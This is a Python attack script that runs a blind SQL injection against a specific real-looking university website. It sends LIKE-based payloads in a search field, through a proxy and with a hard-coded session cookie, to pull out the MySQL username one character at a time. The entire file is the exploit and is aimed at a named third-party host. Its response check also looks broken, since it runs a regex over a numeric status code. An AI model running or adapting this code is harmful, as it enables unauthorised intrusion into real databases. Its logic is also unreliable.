# -*- coding:utf-8 -*-

import http.client
import re
import urllib.request, urllib.parse, urllib.error


payloads = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@_.:/'
print('Start to retrive MySQL User:')
user= ''
knowuser = 'HENANPROVINCE'
oldpayload = ''

for i in range(1,18):
    for payload in payloads:
        urls = 'http://rcloud.edu.cn/articleAction!to_secondArticleList.action'
        newpayload = oldpayload+payload
        params = urllib.parse.urlencode({'searchWord':'1%\')and(user()like\''+newpayload+'%\')and(\'%\'=\''})
        headers = {"Host": "rcloud.edu.cn",
                   "User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:43.0) Gecko/20100101 Firefox/43.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                   "Accept-Encoding": "gzip, deflate",
                   "Referer": "http://rcloud.edu.cn/articleAction!to_secondArticleList.action",
                   "Cookie":"JSESSIONID=64A115CE841D0D1BD61EC09F3630D863",
                   "Connection":"keep-alive",
                   "Content-Type":"application/x-www-form-urlencoded",
                   "Content-Length":len(params)}
        conn = http.client.HTTPConnection('10.18.64.13', 8888, timeout=10)
        conn.request(method='POST',url=urls,body=params,headers=headers)
        result = conn.getresponse().status
        conn.close()
        if re.search('9542',result,re.I):
            oldpayload = oldpayload+payload
            user = oldpayload
            print('\n\n[in progress]', user, end=' ')
            break
print('\n\n[Done] MySQL User is %s' % user)



